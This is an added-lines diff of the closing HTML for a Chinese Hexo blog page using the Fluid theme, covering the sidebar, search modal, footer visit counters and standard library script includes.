+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
